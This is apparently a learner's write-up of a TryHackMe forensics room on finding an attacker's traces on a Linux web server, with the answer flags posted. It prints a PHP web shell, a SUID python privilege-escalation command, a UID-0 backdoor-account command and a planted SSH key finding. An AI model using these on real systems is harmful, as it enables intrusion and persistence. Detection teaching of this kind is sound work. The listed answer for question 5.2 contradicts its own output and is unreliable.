<p align="center">November 8, 2024</p>
<p align="center">Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m genuinely excited to join you on this adventure.<br>
It´s part of my $$\textcolor{#FF69B4}{\textbf{186}}$$-day-streak in  <a href="https://tryhackme.com/r/hacktivities">TryHackMe</a>.</p>

<h1 align="center">
  $$\textcolor{#3bd62d}{\textnormal{ Linux File System Analysis }}$$
</h1>
<p align="center">Perform real-time file system analysis on a Linux system to identify an attacker's artefacts.</p>
<p align="center">Access this 🆓 TryHackMe CTF Room clicking <a href="https://tryhackme.com/r/room/linuxfilesystemanalysis">Linux File System Analysis</a>.</p><br>
<p align="center">
  <img height="150px" hspace="20" src="https://github.com/user-attachments/assets/fdaa9e0d-9485-4f5d-a6eb-33c69aa9cee9">
  <img height="150px" src="https://github.com/user-attachments/assets/4c008c9d-040a-4590-93f0-4e4e42e557cb">
</p>

<p align="center">Summary</p>

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [Introduction](#1) &nbsp;&nbsp;&nbsp;&nbsp;▪️&nbsp;&nbsp;&nbsp;&nbsp; [Investigation Setup](#2) &nbsp;&nbsp;&nbsp;&nbsp;▪️&nbsp;&nbsp;&nbsp;&nbsp; [File, Permissions, and Timestamps](#3) &nbsp;&nbsp;&nbsp;&nbsp;▪️&nbsp;&nbsp;&nbsp;&nbsp; [Users and Groups](#4) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[Users Directories and Files](#5) &nbsp;&nbsp;&nbsp;&nbsp;▪️&nbsp;&nbsp;&nbsp;&nbsp; [Binaries and Executables](#6) &nbsp;&nbsp;&nbsp;&nbsp;▪️&nbsp;&nbsp;&nbsp;&nbsp; [Rootkits](#7) &nbsp;&nbsp;&nbsp;&nbsp;▪️&nbsp;&nbsp;&nbsp;&nbsp; [Conclusion](#8) &nbsp;&nbsp;&nbsp;&nbsp;▪️&nbsp;&nbsp;&nbsp;&nbsp; [Room Complete](#9) &nbsp;&nbsp;&nbsp;&nbsp;▪️&nbsp;&nbsp;&nbsp;&nbsp; [My Journey](#10) </p>

<br>
<br>
<br>
<h2>Task 1. Introduction<a id='1'></a></h2>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the question below}}$$ </h3>
<br>

> 1.1. <em>I'm ready to continue!</em><br><a id='1.1'></a>
>> <code><strong>No answer needed</strong></code>

<br>
<h2>Task 2. Investigation Setup<a id='2'></a></h2>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the question below}}$$ </h3>
<br>

> 2.1. <em>After updating the <code>PATH</code> and <code>LD_LIBRARY_PATH</code> environment variables, run the command >code>check-env</code>. What is the flag that is returned in the output?</em><br><a id='1.1'></a>
>> <code><strong>THM{5514ec4f1ce82f63867806d3cd95dbd8}</strong></code>

<pre><code>$ investigator@ip-[Target_IP]:~$ export PATH=/mnt/usb/bin:/mnt/usb/sbin
investigator@ip-[Target_IP]:~$ export LD_LIBRARY_PATH=/mnt/usb/lib:/mnt/usb/lib64
investigator@ip-[Target_IP]:~$ check-env
THM{5514ec4f1ce82f63867806d3cd95dbd8}
</code></pre>

<br>

<h2>Task 3. Files, Permissions, and Timestamps<a id='3'></a></h2>

<br>

<pre><code>$  ls -al /var/www/html/
total 32
drwxr-xr-x 4 root     root      4096 Feb 12  2024 .
drwxr-xr-x 3 root     root      4096 Feb 12  2024 ..
drwxr-xr-x 2 www-data www-data  4096 Feb 13  2024 assets
-rw-r--r-- 1 root     root     10918 Feb 12  2024 index.html
-rwxr-xr-x 1 www-data www-data   905 Feb 12  2024 upload.php
drwxr-xr-x 2 www-data www-data  4096 Feb 13  2024 uploads
investigator@ip-10-10-229-35:~$ ls -al var/www/html/uploads
ls: cannot access 'var/www/html/uploads': No such file or directory
investigator@ip-10-10-229-35:~$ ls -al /var/www/html/uploads
total 224
drwxr-xr-x 2 www-data www-data 4096 Feb 13  2024 .
drwxr-xr-x 4 root     root     4096 Feb 12  2024 ..
-rw-r--r-- 1 www-data www-data 1908 Feb 12  2024 ABHz3aj.jpeg
-rw-r--r-- 1 www-data www-data 1908 Feb 12  2024 AhVpDoS.jpeg
-rw-r--r-- 1 www-data www-data 1908 Feb 12  2024 AqLnBvC.jpeg
-rw-r--r-- 1 www-data www-data 1908 Feb 12  2024 AsDfGhJ.jpeg
-rw-r--r-- 1 www-data www-data 1908 Feb 12  2024 AzSxWqE.jpeg
-rw-r--r-- 1 www-data www-data 1908 Feb 12  2024 BcFvGtR.jpeg
-rw-r--r-- 1 www-data www-data 1908 Feb 12  2024 BcNmLoP.jpeg
...
-rw-r--r-- 1 www-data www-data 1908 Feb 12  2024 YmLnXhP.jpeg
-rw-r--r-- 1 www-data www-data 1908 Feb 12  2024 YtGfHjK.jpeg
-rw-r--r-- 1 www-data www-data 1908 Feb 12  2024 ZtXcVbN.jpeg
-rw-r--r-- 1 www-data www-data 1908 Feb 12  2024 ZxVbNmQ.jpeg
-rw-r--r-- 1 www-data www-data 1908 Feb 12  2024 ZxXcVuY.jpeg
-rw-r--r-- 1 www-data www-data   30 Feb 13  2024 b2c8e1f5.phtml
</code></pre>


<pre><code>investigator@ip-10-10-229-35:~$ ls -al /var/www/html/uploads | grep -v ".jpeg"
total 224
drwxr-xr-x 2 www-data www-data 4096 Feb 13  2024 .
drwxr-xr-x 4 root     root     4096 Feb 12  2024 ..
-rw-r--r-- 1 www-data www-data   30 Feb 13  2024 b2c8e1f5.phtml
</code></pre>

<pre><code>investigator@ip-10-10-229-35:~$ cat /var/www/html/uploads/b2c8e1f5.phtml 
<?php system($_GET['cmd']);?>
</code></pre>

<pre><code>investigator@ip-10-10-229-35:~$ investigator@ip-10-10-229-35:~$ find / -user www-data -type f 2>/dev/null | less
/var/www/html/assets/reverse.elf
/var/www/html/uploads/MzCxVeR.jpeg
/var/www/html/uploads/AzSxWqE.jpeg
/var/www/html/uploads/QaWsEdR.jpeg
/var/www/html/uploads/TyHjKlM.jpeg
/var/www/html/uploads/PrTgHfD.jpeg
/var/www/html/uploads/YmLnXhP.jpeg
/var/www/html/uploads/LuDjYnW.jpeg
/var/www/html/uploads/LvXcBvN.jpeg
/var/www/html/uploads/AsDfGhJ.jpeg
/var/www/html/uploads/CoSaBmQ.jpeg
/var/www/html/uploads/XkFgHtD.jpeg
/var/www/html/uploads/RfTbMeG.jpeg
/var/www/html/uploads/AqLnBvC.jpeg
/var/www/html/uploads/WzRmDnT.jpeg
/var/www/html/uploads/DnCvBzX.jpeg
/var/www/html/uploads/ZxVbNmQ.jpeg
/var/www/html/uploads/ABHz3aj.jpeg
/var/www/html/uploads/ZxXcVuY.jpeg
/var/www/html/uploads/XcVbNmQ.jpeg
/var/www/html/uploads/KtXoRlN.jpeg
/var/www/html/uploads/RoNpIqU.jpeg
/var/www/html/uploads/XcVbNkL.jpeg
/var/www/html/uploads/VbNmLoP.jpeg
/var/www/html/uploads/YtGfHjK.jpeg
/var/www/html/uploads/BcNmLoP.jpeg
/var/www/html/uploads/LrOjfHa.jpeg
/var/www/html/uploads/LmKdFgH.jpeg
/var/www/html/uploads/FgHyJuK.jpeg
/var/www/html/uploads/BcFvGtR.jpeg
/var/www/html/uploads/DvBnMcP.jpeg
/var/www/html/uploads/QwErTyU.jpeg
/var/www/html/uploads/NcVbOpQ.jpeg
/var/www/html/uploads/FeWcNzT.jpeg
/var/www/html/uploads/PwSaBcZ.jpeg
/var/www/html/uploads/FgHjKlM.jpeg
/var/www/html/uploads/JnKmLoP.jpeg
/var/www/html/uploads/PqAwSdE.jpeg
/var/www/html/uploads/LkMjNhB.jpeg
/var/www/html/uploads/ZtXcVbN.jpeg
/var/www/html/uploads/MqQwErT.jpeg
/var/www/html/uploads/AhVpDoS.jpeg
/var/www/html/uploads/PoGmHsR.jpeg
/var/www/html/uploads/JyGtFdS.jpeg
/var/www/html/uploads/QeRtYuI.jpeg
/var/www/html/uploads/JiRpKaW.jpeg
/var/www/html/uploads/VwPyLoR.jpeg
/var/www/html/uploads/HjGfSdA.jpeg
/var/www/html/uploads/TRWaPSB.jpeg
/var/www/html/uploads/UiJhYtG.jpeg
/var/www/html/uploads/EpSjZxM.jpeg
/var/www/html/uploads/PlKjHgF.jpeg
/var/www/html/uploads/b2c8e1f5.phtml
/var/www/html/uploads/EsKyLbQ.jpeg
/var/www/html/uploads/GQzVDrM.jpeg
/var/www/html/upload.php
...
  
</code></pre>

<pre><code> ls -l /var/www/html/assets/reverse.elf 
-rwxr-xr-x 1 www-data www-data 250 Feb 13  2024 /var/www/html/assets/reverse.elf
</code></pre>

<pre><code> ls -l /var/www/html/assets/reverse.elf 
-rwxr-xr-x 1 www-data www-data 250 Feb 13  2024 /var/www/html/assets/reverse.elf
</code></pre>investigator@ip-10-10-229-35:~$ ls -l /var/www/html/assets/reverse.elf 
-rwxr-xr-x 1 www-data www-data 250 Feb 13  2024 /var/www/html/assets/reverse.elf
investigator@ip-10-10-229-35:~$ ^C
investigator@ip-10-10-229-35:~$ exiftool /var/www/html/assets/reverse.elf 
ExifTool Version Number         : 11.88
File Name                       : reverse.elf
Directory                       : /var/www/html/assets
File Size                       : 250 bytes
File Modification Date/Time     : 2024:02:13 00:26:28+00:00
File Access Date/Time           : 2024:02:13 00:32:59+00:00
File Inode Change Date/Time     : 2024:02:13 00:34:50+00:00
File Permissions                : rwxr-xr-x
File Type                       : ELF executable
File Type Extension             : 
MIME Type                       : application/octet-stream
CPU Architecture                : 64 bit
CPU Byte Order                  : Little endian
Object File Type                : Executable file
CPU Type                        : AMD x86-64
investigator@ip-10-10-229-35:~$ 
</code></pre>


<pre><code>investigator@ip-10-10-229-35:~$ md5sum /var/www/html/assets/reverse.elf 
c6cbdba1c147fbb7239284b7df2aa653  /var/www/html/assets/reverse.elf
</code></pre>

<pre><code>investigator@ip-10-10-229-35:~$ sha256sum /var/www/html/assets/reverse.elf
ee0ea8d8bc205c4e2e2cc9ff7ddb71dee22ac0a50c2042701d49e565e0821410  /var/www/html/assets/reverse.elf
</code></pre>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>
<br>

> 3.1. <em>To practice your skills with the <code>find</code> command, locate all the files that the user <code>bob</code> created in the past 1 minute. Once found, review its contents. What is the flag you receive?</em><br><a id='3.1'></a>
>> <code><strong>THM{0b1313afd2136ca0faafb2daa2b430f3}</strong></code>

<pre><code>investigator@ip-10-10-229-35:~$ find / -user bob -type f -cmin -1 > bob
</code></pre>

<pre><code>investigator@ip-10-10-229-35:~$ cat bob | grep .txt
investigator@ip-10-10-229-35:~$ cat /var/tmp/findme.txt
THM{0b1313afd2136ca0faafb2daa2b430f3}
</code></pre>

> 3.2. <em>Extract the metadata from the <code>reverse.elf</code> file. What is the file's MIME type?</em><br><a id='3.2'></a>
>> <code><strong>application/octet-stream</strong></code>

<pre><code>investigator@ip-10-10-229-35:~$ exiftool /var/www/html/assets/reverse.elf
ExifTool Version Number         : 11.88
File Name                       : reverse.elf
Directory                       : /var/www/html/assets
File Size                       : 250 bytes
File Modification Date/Time     : 2024:02:13 00:26:28+00:00
File Access Date/Time           : 2024:11:08 19:55:06+00:00
File Inode Change Date/Time     : 2024:02:13 00:34:50+00:00
File Permissions                : rwxr-xr-x
File Type                       : ELF executable
File Type Extension             : 
MIME Type                       : application/octet-stream
CPU Architecture                : 64 bit
CPU Byte Order                  : Little endian
Object File Type                : Executable file
CPU Type                        : AMD x86-64
</code></pre>


> 3.3. <em>Run the <code>stat</code> command against the <code>/etc/hosts</code> file on the compromised web server. What is the full <code>Modify Timestamp (mtime)</code> value?</em><br><a id='3.3'></a>
>> <code><strong>2020-10-26 21:10:44.000000000 +0000</strong></code>

<pre><code>investigator@ip-10-10-229-35:~$ stat /etc/hosts
  File: /etc/hosts
  Size: 221       Blocks: 8          IO Block: 4096   regular file
Device: ca01h/51713dInode: 49          Links: 1
Access: (0644/-rw-r--r--)  Uid: (    0/    root)   Gid: (    0/    root)
Access: 2024-11-08 19:31:25.108000000 +0000
Modify: 2020-10-26 21:10:44.000000000 +0000
Change: 2020-10-26 23:32:25.957900650 +0000
 Birth: -
</code></pre>

<br>
<h2>Task 4. Users and Groups<a id='4'></a></h2>
<p>As we continue our investigation, we should focus on the system's users and groups. In doing so, we may uncover evidence of the attacker moving laterally or maintaining access throughout the system by exploiting additional vulnerabilities.</p>

<h3>Identifying User Accounts</h3>

<p>Within UNIX-like systems, the /etc/ directory is a central location that stores configuration files and system-wide settings. Specifically, when investigating user accounts, <code>/etc/passwd</code>code> is a colon-separated plaintext file that contains a list of the system's accounts and their attributes, such as the user ID (UID), group ID (GID), home directory location, and the login shell defined for the user.</p>

<p>Let's view the user accounts on the affected system by reading the file:</p>

<pre><code>investigator@ip-10-10-226-120:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
...
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
bob:x:1001:1001::/home/bob:/bin/bash
jane:x:1002:1002:Jane Walkers,103,9399499494,2029384958:/home/jane:/bin/bash
investigator:x:1003:1003:Investigator,1,1,1,1:/home/investigator:/bin/bash
postfix:x:113:120::/var/spool/postfix:/usr/sbin/nologin
b4ckd00r3d:x:0:1004::/home/b4ckd00r3d:/bin/sh
</code></pre>

<p>Attackers can maintain access to a system by creating a backdoor user with root permissions. We can leverage the <code>cut</code> and <code>grep</code> commands to identify this type of user account backdoor quickly. The following command extracts and displays all user accounts with the user ID (UID) of 0. The presence of a user with UID 0, other than the legitimate root user account, can quickly suggest a potential backdoor account.</p>

<pre><code>investigator@ip-10-10-226-120:~$ cat /etc/passwd | cut -d: -f1,3 | grep ':0$'
root:0
b4ckd00r3d:0
</code></pre>

<p>In the above command, we first display the contents of the <code>/etc/passwd</code> file. We then take the contents and perform a <code>cut</code> action to extract only the first (username) and third (user ID) fields from each line, delimited (<code>-d</code> by the <code>:</code> character. We then use the <code>grep</code> command to extract specific entries containing <code>:0</code>, signifying a user ID of 0.<br>

This, however, is not a foolproof method, as the backdoor account could have been created with legitimate user and group IDs. For further investigation, we can take a look at <code>groups</code>.</p>

<h3>Identifying Groups</h3>
<p>In Linux systems, certain groups grant specific privileges that attackers may target to escalate their privileges. Some important Linux groups that might be of interest to an attacker include:</p>

<p>.................</p>

<p>We can view all of the groups (and their respective group IDs) on the system by reading the <code>/etc/group</code>code> file:</p>

<pre><code>investigator@ip-10-10-226-120:~$ cat /etc/group
root:x:0:
daemon:x:1:
bin:x:2:
sys:x:3:
adm:x:4:syslog,ubuntu,investigator
tty:x:5:syslog
...
backup:x:34:
operator:x:37:
list:x:38:
irc:x:39:
src:x:40:
...
bob:x:1001:
jane:x:1002:
investigator:x:1003:
postfix:x:120:
postdrop:x:121:
b4ckd00r3d:x:1004:
</code></pre>

<br>
<p>To determine which groups a specific user is a member of, we can run the following command:</p>
<br>

<pre><code>investigator@ip-10-10-226-120:~$ groups investigator
investigator : investigator adm dialout cdrom floppy sudo audio dip video plugdev netdev lxd
</code></pre>

<br>

<p>To determine which groups a specific user is a member of, we can run the following command:</p>

<pre><code>investigator@ip-10-10-226-120:~$ groups investigator
investigator : investigator adm dialout cdrom floppy sudo audio dip video plugdev netdev lxd
</code></pre>

<p>Alternatively, to list all of the members of a specific group, we can run the following command:</p>p>

<pre><code>investigator@ip-10-10-226-120:~$ getent group admin
admin:x:116:
</code></pre>

<p>If multiple users are in a group (as seen above), their usernames will be listed in a comma-separated format in the entry.<br>

To list all users in the sudo group, we can provide either the name "sudo" or the group ID, typically 27.</p>

<pre><code>investigator@ip-10-10-226-120:~$ getent group 27
sudo:x:27:ubuntu,investigator
</code></pre>

<h3>User Logins and Activity</h3>
<p>Checking user logins and activity is valuable for performing a real-time analysis of a compromised system. Fortunately, a couple of useful utilities and logs can assist us.<br>

<strong>last and lastb</strong><br>

The <code>last</code> command is an excellent tool for examining user logins and sessions. It is used to display the history of the last logged-in users. It works by reading the <code>/var/log/wtmp</code> file, which is a file that contains every login and logout activity on the system. Similarly, <code>lastb</code> specifically tracks failed login attempts by reading the contents of /var/log/btmp, which can help identify login and password attacks.</p>

<pre><code>investigator@ip-10-10-226-120:~$ last
investig pts/0        10.100.2.80      Fri Nov  8 22:52   still logged in
reboot   system boot  5.4.0-1029-aws   Fri Nov  8 22:50   still running
investig pts/1        10.10.101.34     Tue Feb 13 02:23 - crash (269+20:26)
investig pts/0        10.10.101.34     Tue Feb 13 02:16 - 02:22  (00:05)
reboot   system boot  5.4.0-1029-aws   Tue Feb 13 02:14   still running
jane     pts/1        10.10.101.34     Tue Feb 13 00:36 - crash  (01:37)
jane     pts/1        10.10.101.34     Tue Feb 13 00:35 - 00:36  (00:01)
investig pts/0        10.10.101.34     Tue Feb 13 00:31 - crash  (01:43)
reboot   system boot  5.4.0-1029-aws   Tue Feb 13 00:28   still running
ubuntu   pts/0        10.13.46.43      Mon Feb 12 23:05 - crash  (01:23)
reboot   system boot  5.4.0-1029-aws   Mon Feb 12 23:05   still running
ubuntu   pts/0        10.13.46.43      Mon Feb 12 21:22 - crash  (01:42)
reboot   system boot  5.4.0-1029-aws   Mon Feb 12 21:21   still running
...
reboot   system boot  5.4.0-1029-aws   Mon Feb 12 16:30   still running
ubuntu   pts/0        10.13.46.43      Mon Feb 12 16:24 - crash  (00:05)
ubuntu   pts/1        10.13.46.43      Mon Feb 12 16:20 - crash  (00:09)
ubuntu   pts/0        10.13.46.43      Mon Feb 12 16:16 - 16:20  (00:04)
reboot   system boot  5.4.0-1029-aws   Mon Feb 12 16:11   still running
</code></pre>


<strong>lastlog</strong><br>

<p>Unlike the <code>last</code> command, which provides information about all user logins, the <code>lastlog</code> command focuses on a user's most recent login activity and reads from the <code>/var/log/lastlog</code>code> file.</p>

<pre><code>investigator@ip-10-10-226-120:~$ lastlog
Username         Port     From             Latest
root                                       **Never logged in**
...
</code></pre>

<strong>Failed Login Attempts</strong><br>
<p>In addition to <code>lastb</code>, there are other ways to view failed login attempts on Linux through specific log files. The <code>/var/log/auth.log</code> file (or <code>/var/log/secure</code> on some distributions like CentOS or Red Hat) contains records of authentication-related events, including both successful and failed login attempts.</p>

<strong>who</strong><br>
<p>The <code>who</code> command is a very straightforward command that can be used to display the users that are currently logged into the system. The output of this command can provide details such as the name of the user logged in, the terminal device used, the time that the session was established, idle activity, the process ID of the shell, and additional comments that may include details such as the initial command used to start the session.</p>

<pre><code>investigator@ip-10-10-226-120:~$ who
investigator pts/0        2024-11-08 22:52 (10.100.2.80)
</code></pre>

<h3>Sudo</h3>
<p>The <code>/etc/sudoers</code> file is a particularly sensitive configuration file within Unix-like systems. It determines which users possess sudo privileges, enabling them to execute commands as other users, typically the root user.<br>

As a result, it can be a target for attackers seeking persistence. For instance, if an attacker can find a way to insert their user account (or one that they control) into the sudoers file, they could grant themselves elevated privileges without requiring authentication. Alternatively, they may alter existing entries to broaden their access.<br>

For example, a line in a sudoers file might look like this:</p>

<pre><code>investigator@ip-10-10-226-120:~$ sudo cat /etc/sudoers
[sudo] password for investigator: 
#
# This file MUST be edited with the 'visudo' command as root.
#
# Please consider adding local content in /etc/sudoers.d/ instead of
# directly modifying this file.
#
# See the man page for details on how to write a sudoers file.
#
Defaultsenv_reset
...
</code></pre>

<p>More specifically, this line specifies:</p>

<p>..............................</p>

<p>With this configuration, Richard can execute <code>ifconfig</code> with elevated sudo privileges to manage network interfaces as necessary.</p>



<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the question below}}$$ </h3>
<br>


> 4.1. <em>Investigate the user accounts on the system. What is the name of the backdoor account that the attacker created??</em><br><a id='4.1'></a>
>> <code><strong>b4ckd00r3d</strong></code>

<pre><code>investigator@ip-10-10-226-120:~$ lastlog
Username         Port     From             Latest
root                                       **Never logged in**
daemon                                     **Never logged in**
bin                                        **Never logged in**
sys                                        **Never logged in**
sync                                       **Never logged in**
games                                      **Never logged in**
...
bob              pts/0    10.13.46.43      Mon Feb 12 19:00:00 +0000 2024
jane             pts/1    10.10.101.34     Tue Feb 13 00:36:37 +0000 2024
investigator     pts/0    10.100.2.80      Fri Nov  8 22:52:37 +0000 2024
postfix                                    **Never logged in**
b4ckd00r3d                                 **Never logged in**
</code></pre>

<br>

> 4.2. <em>What is the name of the group with the group ID of <code>46</code>?</em><br><a id='4.2'></a>
>> <code><strong>plugdev</strong></code>

<pre><code>investigator@ip-10-10-226-120:~$ getent group 46
plugdev:x:46:ubuntu,investigator
</code></pre>

<br>

> 4.3. <em>View the /etc/sudoers file on the compromised system. What is the full path of the binary that Jane can run as sudo?</em><br><a id='4.3'></a>
>> <code><strong>/usr/bin/pstree</strong></code>

<pre><code>investigator@ip-10-10-226-120:~$ sudo cat /etc/sudoers
[sudo] password for investigator: 
#
# This file MUST be edited with the 'visudo' command as root.
#
# Please consider adding local content in /etc/sudoers.d/ instead of
# directly modifying this file.
#
# See the man page for details on how to write a sudoers file.
#
Defaultsenv_reset
Defaultsmail_badpass
Defaultssecure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"

# Host alias specification

# User alias specification

# Cmnd alias specification

# User privilege specification
rootALL=(ALL:ALL) ALL

# Members of the admin group may gain root privileges
%admin ALL=(ALL) ALL

# Allow members of group sudo to execute any command
%sudoALL=(ALL:ALL) ALL

# See sudoers(5) for more information on "#include" directives:

#includedir /etc/sudoers.d

jane ALL=(ALL) /usr/bin/pstree
</code></pre>

<br>
<h2>Task 5. Users Directorires and Files<a id='5'></a></h2>
<p>In the previous task, we identified a backdoor account that the attacker created and gained access to. However, we should take a step back and determine how the attacker got the privileges to create that account in the first place. To expand our investigation into the system's users and groups, we should also look into each user's personal directory, files, history, and configurations..</p>

<h3>User Home Directories</h3>

<p>User home directories in Linux contain personalised settings, configurations, and user-specific data. These directories are typically located under the <code>/home</code> directory and are named after the corresponding usernames on the system. Recall viewing the <code>/etc/passwd</code> file and identifying various users and their home directories.<br>

We can list out the home directories with a simple <code>ls -l</code> command:</p>

<pre><code>investigator@ip-10-10-226-120:~$ ls -l /home
total 16
drwxr-xr-x 4 bob          bob          4096 Feb 12  2024 bob
drwxr-xr-x 3 investigator investigator 4096 Feb 13  2024 investigator
drwxr-xr-x 4 jane         jane         4096 Feb 13  2024 jane
drwxr-xr-x 5 ubuntu       ubuntu       4096 Feb 12  2024 ubuntu
</code></pre>

<h3>Hidden Files</h3>
<p>Hidden files, identified by a leading dot in their filenames, often store sensitive configurations and information within a user's home directory. By default, we cannot list out these hidden files using <code>ls</code>. To view them, we need to provide the <code>-a</code> argument, which will include all entries starting with a dot.<br>

To list out the hidden files within Jane's home directory, run:</p>

<pre><code>investigator@ip-10-10-226-120:~$ ls -a /home/jane
.  ..  .bash_history  .bash_logout  .bashrc  .cache  .profile  .ssh
</code></pre>

<p>Some common files that would be of interest during an investigation include:</p>

<p>................</p>

<p>Additionally, we can look at other files and directories of interest, like browser profiles and the <code>.ssh</code> directory.</p>

<h3>SSH and Backdoor2</h3>
<p>The <code>.ssh</code> directory is a susceptible area containing configuration and key files related to SSH connections. The <code>authorized_keys</code>code> file within the directory is critical because it lists public keys allowed to connect to a user's account over SSH.<br>

If a malicious user gains unauthorised access to a system and wants to persistently access another user's account (for example, Jane's account) by adding their public key to the <code>authorized_keys</code> file, we can potentially uncover artefacts that hint at these actions.<br>

First, navigate to the <code>.ssh</code> directory within Jane's home folder. From here, we can run an <code>ls -al</code> to list the contained files:</p>

<pre><code>investigator@ip-10-10-226-120:~$  ls -al /home/jane/.ssh
total 20
drwxr-xr-x 2 jane jane 4096 Feb 12  2024 .
drwxr-xr-x 4 jane jane 4096 Feb 13  2024 ..
-rw-rw-rw- 1 jane jane 1136 Feb 13  2024 authorized_keys
-rw------- 1 jane jane 3389 Feb 12  2024 id_rsa
-rw-r--r-- 1 jane jane  746 Feb 12  2024 id_rsa.pub
</code></pre>

<p>Let's view the file to see if we can identify any unintended authorised public keys:</p>

<pre><code>investigator@ip-10-10-226-120:~$ cat /home/jane/.ssh/authorized_keys
ssh-rsa [Redacted]
ssh-rsa A[Redacted]
investigator@ip-10-10-226-120:~$ 
</code></pre>

<p>Notice that there are two entries. The first belongs to Jane, as signified by the ending comment. However, the second entry appears to be related to an entirely different keypair with the comment "backdoor". The attacker was likely able to edit this file and append their own public key, allowing them SSH access as Jane.

We can further confirm this by returning to the <code>stat</code> command. By running it on the file, we can see that it was last modified around a similar timeframe to when we confirmed the attacker gained an initial foothold on the system.</p>

<pre><code>investigator@ip-10-10-226-120:~$ stat /home/jane/.ssh/authorized_keys 
  File: /home/jane/.ssh/authorized_keys
  Size: 1136      Blocks: 8          IO Block: 4096   regular file
Device: ca01h/51713dInode: 257561      Links: 1
Access: (0666/-rw-rw-rw-)  Uid: ( 1002/    jane)   Gid: ( 1002/    jane)
Access: 2024-11-08 23:42:25.784000000 +0000
Modify: 2024-02-13 00:34:16.005897449 +0000
Change: 2024-02-13 00:34:16.005897449 +0000
 Birth: -
</code></pre>

<br>
<p>If we look back to the output of the <code>ls -al</code> command, we can identify the permission misconfiguration that made this possible:</p>

<pre><code>investigator@ip-10-10-226-120:~$ ls -al /home/jane/.ssh/authorized_keys 
-rw-rw-rw- 1 jane jane 1136 Feb 13  2024 /home/jane/.ssh/authorized_keys
</code></pre>

<p>As identified by the third <code>rw</code>permissions, this file is world-writable, which should never be the case for sensitive files. Consequently, by exploiting this misconfiguration, the attacker gained unauthorised SSH access to the system as if they were Jane.</p>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>
<br>


> 5.1. <em>View Jane's <code>.bash_history</code> file. What flag do you see in the output?</em><br><a id='5.1'></a>
>> <code><strong>THM{f38279ab9c6af1215815e5f7bbad891b}</strong></code>

<pre><code>investigator@ip-10-10-226-120:/home/jane$ sudo cat .bash_history
[sudo] password for investigator: 
whoami
groups
cd ~
ls -al
find / -perm -u=s -type f 2>/dev/null
/usr/bin/python3.8 -c 'import os; os.execl("/bin/sh", "sh", "-p", "-c", "cp /bin/bash /var/tmp/bash && chown root:root /var/tmp/bash &
& chmod +s /var/tmp/bash")'
ls -al /var/tmp
exit
useradd -o -u 0 b4ckd00r3d
exit
THM{f38279ab9c6af1215815e5f7bbad891b}
investigator@ip-10-10-226-120:/home/jane$ 
</code></pre>

<br>

> 5.2. <em>What is the hidden flag in Bob's home directory?</em><br><a id='5.2'></a>
>> <code><strong>THM{f38279ab9c6af1215815e5f7bbad891b}</strong></code>

<pre><code>investigator@ip-10-10-226-120:/home/bob$ ls -la
total 36
drwxr-xr-x 4 bob  bob  4096 Feb 12  2024 .
drwxr-xr-x 6 root root 4096 Feb 12  2024 ..
-rw-r--r-- 1 bob  bob   220 Feb 12  2024 .bash_logout
-rw-r--r-- 1 bob  bob  3771 Feb 12  2024 .bashrc
drwx------ 2 bob  bob  4096 Feb 12  2024 .cache
...
-rw-rw-r-- 1 bob  bob    38 Feb 12  2024 .hidden34
-rw-rw-r-- 1 bob  bob     0 Feb 12  2024 .hidden35
-rw-rw-r-- 1 bob  bob     0 Feb 12  2024 .hidden36
-rw-rw-r-- 1 bob  bob     0 Feb 12  2024 .hidden37
...
-rw-rw-r-- 1 bob  bob     0 Feb 12  2024 .hidden7
-rw-rw-r-- 1 bob  bob     0 Feb 12  2024 .hidden8
-rw-rw-r-- 1 bob  bob     0 Feb 12  2024 .hidden9
drwxrwxr-x 3 bob  bob  4096 Feb 12  2024 .local
-rw-r--r-- 1 bob  bob   807 Feb 12  2024 .profile
-rw-rw-r-- 1 bob  bob    66 Feb 12  2024 .selected_editor
</code></pre>

<pre><code>investigator@ip-10-10-226-120:/home/bob$ cat .hidden34
THM{6ed90e00e4fb7945bead8cd59e9fcd7f}
</code></pre>

<br>

> 5.3. <em>Run the <code>stat</code> command on Jane's <code>authorized_keys</code> file. What is the full timestamp of the most recent modification?</em><br><a id='5.3'></a>
>> <code><strong>2024-02-13 00:34:16.005897449 +0000</strong></code>


<pre><code>investigator@ip-10-10-226-120:/home/jane/.ssh$ ls -la
total 20
drwxr-xr-x 2 jane jane 4096 Feb 12  2024 .
drwxr-xr-x 4 jane jane 4096 Feb 13  2024 ..
-rw-rw-rw- 1 jane jane 1136 Feb 13  2024 authorized_keys
-rw------- 1 jane jane 3389 Feb 12  2024 id_rsa
-rw-r--r-- 1 jane jane  746 Feb 12  2024 id_rsa.pub
investigator@ip-10-10-226-120:/home/jane/.ssh$ stat authorized_keys
  File: authorized_keys
  Size: 1136      Blocks: 8          IO Block: 4096   regular file
Device: ca01h/51713dInode: 257561      Links: 1
Access: (0666/-rw-rw-rw-)  Uid: ( 1002/    jane)   Gid: ( 1002/    jane)
Access: 2024-11-08 23:42:25.784000000 +0000
Modify: 2024-02-13 00:34:16.005897449 +0000
Change: 2024-02-13 00:34:16.005897449 +0000
 Birth: -
</code></pre>

<br>
